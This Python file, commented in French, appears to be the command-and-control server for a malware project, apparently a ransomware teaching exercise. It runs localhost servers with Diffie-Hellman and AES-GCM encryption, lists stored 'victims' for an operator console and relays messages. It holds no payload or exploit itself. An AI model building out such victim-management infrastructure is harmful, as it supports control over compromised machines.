# coding: utf8
from utile.network import start_serv, connect, send_message, receive_message
from utile.data import readVictims
from utile.message import creat_dict
from utile.security import receive_Diffie_Hellman_exchange_key, AES_GCM_encrypt, AES_GCM_decrypt
from _thread import *
import time
import json



lock = allocate_lock()  # Allocation du vérou pour les thread
IP = "127.0.0.1"        # Ip pour les serveur
PORT_CONSOLE = 8380     # Port de création vers la console
PORT_FRONTAL = 8381     # Port de création vers le serveur frontal
PORT_SCONSOLE = 8382    # Port de connexion vers la console
PORT_SFRONTAL = 8383    # Port de connexion vers le serveur frontal


def main():

    """
    Boucle infinie qui crée les threads quand nécéssaire.
    :return: NA
    """
    #s = start_serv(IP, PORT_CONSOLE)
    #common_secret = Diffie_Hellman_exchange_key(s, IP, PORT_CONSOLE)  # Récupération de la clé commune
    #print(common_secret)


    while True:
        try:
            time.sleep(1)                                           #Pause d'une seconde pour laisser le thread se créér
            lock.acquire()                                          # Acquisition du vérrou pour le thread de la console
            start_new_thread(thread_master, (IP, PORT_CONSOLE))     # Création du thread pour le serv vers la console
            time.sleep(1)                                           #Pause d'une seconde pour laisser le thread se créér
            start_new_thread(thread_master, (IP, PORT_FRONTAL))     # Création du thread pour le serv vers le serv front
        except OSError:                                             # Exception pour un affichage d'erreur plus propre
            pass


def thread_master(ip, port):

    """
    Fonction "carrefour" pour les threads créé. Gere les aspects commun des threads. Et les renvois au bon endroit
    :param ip: IP des serveur
    :param port: Port passé en paramètre pour créer les serveurs
    :return: NA
    """

    s = ''

    while lock:                                         # Boucle tant que le thread à un lock
        try:
            common_secret = None
            print("start serveur", ip, port)            # Lance le serveur avec les paramètres reçu en paramètre
            s = start_serv(ip, port)
            common_secret = receive_Diffie_Hellman_exchange_key(s, ip, port)    # Récupération de la clé commune
            #print(common_secret)
            break
        except OSError:                                 # Exception pour affichage d'erreur plus propre
            print("Impossible de lancer le thread")
            time.sleep(5)                               # Attend 5 secondes avant de relancer le thread

    if port == PORT_CONSOLE and common_secret:          # Test pour savoir à quelle fonction acceder
        threaded_console(s, common_secret)
        lock.release()                                  # Thread terminé suppression du verrou
    elif port == PORT_FRONTAL and common_secret:
        threaded_frontal(s, common_secret)
        lock.release()                                  # Thread terminé suppression du verrou


def threaded_console(s, common_key):

    """
    Thread "principal" pour la console
    :param s: socket de connexion
    :param common_key: clé diffie hellman
    :return: NA
    """

    flag = ""

    while flag != "Quit":               # Boucle jusqu'à la reception du "Quit" depuis la console de controle
        flag = receive_message(s)       # Reception du message de la console
        flag = bytes.decode(AES_GCM_decrypt(flag, common_key), 'utf-8')

        if flag == "1":
            listing(common_key)                   # Rentre dans la fonction de listing
        elif flag == "2":
            historique(s, common_key)               # Rentre dans la fonction pour l'historique
        elif flag == "Quit":
            s.close()                   # Ferme la connexion proprement


def threaded_frontal(s, common_key):

    while True:
        message = receive_message(s)
        message = bytes.decode(AES_GCM_decrypt(message, common_key), 'utf-8')
        if message == 'quit':
            s.close()
            break
        else:
            print(message)


def listing(common_key):

    """
    Fonction qui list les victimes enregistrées dans la DB
    :return: NA
    """

    connexion = connect(IP, PORT_SCONSOLE, True)                #Récupération d'un tuple depuis la fonction de connexion
    socket = connexion[0]                                       # Séparation du socket et de g_p récupéré dans le tuple

    victim = readVictims()                                      # Accès à la DB et récupère les victimes
    for element in range(len(victim)):                          # Boucle jusqu'à la fin de la liste
        victim_dict = creat_dict(victim[element])               # Insère la victime 'x' dans le dictionnaire pour le
        #print(victim[element])                                 # Transfert vers la console
        encrypted = AES_GCM_encrypt(str(victim_dict), common_key)    #Envois le dictionnaire à la console
        send_message(socket, encrypted, IP, PORT_SCONSOLE)
        time.sleep(1)                                           #Sleep d'une seconde pour laisser le temps de traitement
    encrypted = AES_GCM_encrypt("Fin", common_key)  # Message de fin de listing
    send_message(socket, encrypted, IP, PORT_SCONSOLE)


def historique(s, common_key):

    """
    Fonction qui permet de récupéré les infos d'une victime spécifique
    :param common_key: Clé diffie hellman
    :param s: Socket de connexion
    :return: NA
    """

    try:
        id_victim = receive_message(s)                          # Récupère l'id envoyé par la console
        id_victim = bytes.decode(AES_GCM_decrypt(id_victim, common_key), 'utf-8')
        #print(id_victim)
        victim = readVictims(id_victim)                         # Cherche la victime dans la DB lié à l'ID
        #print(victim)

        if not victim:                                          # Message d'erreur si victime non trouvée
            encrypted = AES_GCM_encrypt("Fin", common_key)
            send_message(s, encrypted, IP, PORT_SCONSOLE)
        else:
            victim_dict = creat_dict(victim)                    # Récupère la victime et l'insère dans un dictionnaire
            #print(victim_dict)                                 # Pour l'envois vers la console
            time.sleep(5)                                       #Sleep de 5 secondes pour laisser le temps de traitement
            encrypted = AES_GCM_encrypt(str(victim_dict), common_key)
            send_message(s, encrypted, IP, PORT_SCONSOLE)  # Envois du dictionnaire
    except OSError as e:                                        # Exception pour affichage d'erreur plus propre
        print(e)


if __name__ == '__main__':
    main()
